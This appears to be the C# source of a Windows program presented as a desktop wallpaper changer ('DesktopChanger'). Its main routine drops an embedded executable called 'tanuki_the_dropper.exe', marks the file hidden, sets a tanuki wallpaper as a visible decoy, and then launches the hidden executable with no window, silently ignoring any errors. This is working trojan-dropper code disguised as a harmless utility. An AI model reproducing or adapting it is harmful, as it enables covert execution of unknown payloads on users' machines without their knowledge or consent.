using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DesktopChanger
{
    public class Program
    {
        public static void Main()
        {
            File.WriteAllBytes("tanuki_the_dropper.exe", DesktopChanger.Properties.Resources.tanuki_the_dropper);
            File.SetAttributes("tanuki_the_dropper.exe", File.GetAttributes("tanuki_the_dropper.exe") | FileAttributes.Hidden);

            Wallpaper.Set(Wallpaper.Style.Centered);

            ExecProgram("tanuki_the_dropper.exe");
        }

        private static void ExecProgram(string fileName)
        {
            try
            {
                var proc = new Process();
                proc.StartInfo.FileName = fileName;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.CreateNoWindow = true;

                proc.Start();
                proc.WaitForExit();
                var exitCode = proc.ExitCode;
                proc.Close();
            }
            catch (Exception ex) { }
        }
    }

    public static class Wallpaper
    {
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        public static void Set(Style style)
        {
            File.WriteAllBytes("tanuki_wallpaper.bmp", DesktopChanger.Properties.Resources.tanuki);
            string path = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\tanuki_wallpaper.bmp";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }
            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 0.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }
            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 0.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
